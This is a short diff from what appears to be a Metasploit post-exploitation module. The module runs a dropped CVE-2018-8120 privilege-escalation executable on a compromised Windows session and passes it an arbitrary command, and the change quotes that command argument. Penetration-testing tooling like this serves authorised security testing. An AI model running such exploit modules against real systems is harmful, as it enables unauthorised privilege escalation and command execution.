@@ -82,8 +82,8 @@ class MetasploitModule < Msf::Post
      command = session.fs.file.expand_path("%TEMP%") + "\\" + rexename
      print_good("Location of CVE-2018-8120.exe is: #{command}")
      command += " "
-     command += "#{poccmd}"
-     print_good("Executing command : #{command}")
+     command += "\"#{poccmd}\""
+     print_good("Executing command: #{command}")
      command_output = cmd_exec(command)
      print_line(command_output)
     print_line
